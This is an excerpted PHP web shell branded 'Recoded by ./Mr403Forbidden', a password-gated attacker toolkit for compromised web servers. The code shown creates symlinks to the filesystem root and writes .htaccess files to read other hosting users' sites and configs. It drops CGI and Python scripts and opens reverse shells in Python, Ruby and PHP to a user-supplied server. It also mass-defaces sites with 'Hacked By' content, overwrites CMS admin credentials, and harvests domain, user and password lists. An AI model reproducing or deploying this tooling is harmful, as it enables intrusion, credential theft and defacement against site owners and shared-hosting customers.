...
$auth_pass = "c347fc867b4a339639fbac8c96410afd";
...
<br>
<header>
<img src='https://lh3.googleusercontent.com/YGqr3CRLm45jMF8eM8eQxc1VSERDTyzkv1CIng0qjcenJZxqV5DBgH5xlRTawnqNPcOp=w300' width='400' height='400' align='center'>
<br>
<br>
...
<title>Recoded by ./Mr403Forbidden</title>
<script type='text/javascript'>
//<![CDATA[
msg = " Recoded by ./Mr403Forbidden ";
...
$_c7e = 'Li9NcjQwM0ZvcmJpZGRlbg==';
echo "<center><font size='7px' color='white'>File-<font color='cyan'>Manager <font color='blue'>SHELL</font></font></font>";
$sys = php_uname();
...
echo '<form action="?patch='.$path.'&do=logout" method="post">';
    ...
    echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
        if (isset($_POST['Colii'])){
            ...
            $file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","x140.txt");
            $rt="<br><a href=symvhosts/x140.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
    ...
    $cgi_dir = mkdir('x140_cgi', 0755);
        chdir('x140_cgi');
    $file_cgi = "cgi2.x140";
        $memeg = ".htaccess";
    $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks n AddType application/x-httpd-cgi .x140 n AddHandler cgi-script .x140 n AddHandler cgi-script .x140";
    $htcgi = fopen(".htaccess", "w");
    $cgi_script = "";
    $cgi = fopen($file_cgi, "w");
    fwrite($cgi, base64_decode($cgi_script));
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
        chmod($memeg, 0755);
    echo "<br><center>Done ... <a href='x140_cgi/cgi2.x140' target='_blank'>Klik Here</a>";
    ...
    chmod($file_cgi, 0755);
        chmod($memeg, 0755);
    echo "<br><center>Done ... <a href='x140_cgi/cgipy.x140' target='_blank'>Klik Here</a>";
    ...
    if($_POST['submit']) {
        ...
        foreach($domain as $url) {
            ...
            if(preg_match("<font color=red>OK</font></li>/i", $zoneh)) {
...
echo '<center><b><a href="https://www.facebook.com/vicry.ahmad.9">Recoded By ./Mr403Forbidden</a></b><br>
...
if($_POST['ojaykan']){
rmdir("x140_symlink404");mkdir("x140_symlink404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." x140_symlink404/".$jnck);
symlink($dir,"x140_symlink404/".$jnck);
$inija = fopen("x140_symlink404/.htaccess", "w");
...
Satisfy Any
");
echo'<a href="x140_symlink404/" target="_blank">Klik Gan >:(</a>';
}
...
<td>".$user['name']."</td>
<td><a href='$full/x140_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/x140_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("x140_sym",0777);@chdir("x140_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex x140.htm
AddType text/plain .php
AddHandler text/plain .php
...
$becaa=base64_decode("");
$pbcaa=@fopen('bcpyt.py','w');
fwrite($pbcaa,$becaa);
$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out1n".exe("ps aux | grep bcpyt.py")."</pre>";
unlink("bcpyt.py");
}
...
sleep(1);
echo "<pre>$out2n".exe("ps aux | grep bcruby.rb")."</pre>";
unlink("bcruby.rb");
}
if($_POST['backconnect'] == 'php') {
            ...
            if($errno != 0){
              ...
              fputs ($sockfd ,"
                n{################################################################}
                n..:: BackConnect Php By ./Mr403Forbidden ::..
                n{################################################################}n");
              $dir = shell_exec("pwd");
              ...
              while(!feof($sockfd)){ $cmdPrompt = '[x140]#:> ';
    ...
    if(file_exists('adminer.php')) {
        ...
        if(adminer("https://www.adminer.org/static/download/4.7.0/adminer-4.7.0.php","adminer.php")) {
            echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
...
echo "<center><form method='post'>
    <font style='text-decoration: underline;'>x140@".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>
...
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."n";
$ch = curl_init();
...
";
    ...
    if($_POST['mass'] == 'onedir') {
        echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>n";
        $ini="http://";
        ...
        echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>n";
...
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' style='width: 450px;' placeholder='http://jembod.com/x140_symconf/'><br>
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By ./Mr403Forbidden'><br>POST CONTENT: <input type='text' name='content' value='Hacked By ./Mr403Forbidden'><br>POSTNAME: <input type='text' name='postname' value='HackeD By ./Mr403Forbidden'><br>
...
if($_POST['sikat']) {
    ...
    echo"</textarea><br>
        User Baru : <input type='text' name='newuser' placeholder='x140'> <br><br>
        Password Baru : <input type='text' name='newpasswd' placeholder='x140'><br><br>
    ...
    Link Config :<br>
    <input type="text" name="linkconfig" height="10" style="width: 450px;" placeholder="http://jembod.com/x140_symconf/"><br>
...
echo '<br><br><hr color="#191919"><br><center>Copyright &copy '.date("Y").' <a href="http://www.mr403forbidden.tk/" target="_blank">MyBlog</a> - <a href="https://www.facebook.com/vicry.ahmad.9" target="_blank">'.$_COPY.'</a></center>
</body>
</html>';
?>